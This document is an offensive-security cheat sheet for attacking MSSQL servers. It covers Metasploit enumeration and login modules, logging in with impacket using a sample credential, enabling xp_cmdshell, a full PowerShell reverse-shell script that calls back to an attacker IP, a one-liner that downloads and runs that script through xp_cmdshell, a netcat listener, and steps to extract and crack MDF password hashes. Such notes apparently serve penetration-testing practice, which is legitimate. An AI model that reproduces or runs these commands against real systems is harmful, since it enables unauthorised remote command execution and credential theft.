# MSSQL (1433/1434)

--- 

### 1) MSSQL Enumeration

- check version -- is it exploitable?
	- enumerate with metasploit: `use auxiliary/scanner/mssql/mssql_enum`
- do you have credentials?
	- login with metasploit: `use auxiliary/scanner/mssql/mssql_login`


<br> 

### 2) MSSQL Exploitation

Check login credentials with metasploit:
- `use auxiliary/scanner/mssql/mssql_payload`

Get shell on system with impacket script:
- a) get MSSQL details
- b) use `mssqlclient.py` impacket script:
	- usage: `python3 mssqlclient.py <dbase>/<username>@<host> -windows-auth`
	- i.e. `python3 ~/Tools/impacket/examples/mssqlclient.py RALPH/sa:poiuytrewq@10.11.1.31`
- c)  once logged in, reconfigure xp_cmdshell to use PowerShell  commands:
	- i.e. `EXEC sp_configure 'Show Advanced Options', 1;` -> `reconfigure;` -> `sp_configure 'xp_cmdshell', '1'` -> `reconfigure`
- d) then create PowerShell reverse shell (`shell.ps1`):
	```powershell
	$client = New-Object System.Net.Sockets.TCPClient("10.10.15.73",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	```
- e) host it with Python web server (`sudo python3 -m http.server 80`)
- f) create netcat listener (`sudo rlwrap nc -nvlp 443`)
- g) download and execute reverse shell through `xp_cmdshell`
	- i.e `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.73/shell.ps1\");"`

<br>

Crack MDF hashes:
- a) get the `master.mdf` file from the MSSQL server installation 
	- i.e. from `C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.md` or `C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.md`
- b) downloaded the PowerShell script [Inovke-MDFHashes](https://github.com/xpn/Powershell-PostExploitation) and fixed DLL issues (see pull requests
- c) run PowerShell in Kali with `pwsh`, imported script with `Import-Module ./Get-MDFHashes.ps1`, and fixed DLL path issues with `Add-Type -path ./OrcaMDF.Framework.dll`
	- i.e. `Get-MDFHashes -mdf "master.mdf"`
- d) crack found hashes with John: `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
- e) use `mssqlclient.py` impacket script to login




 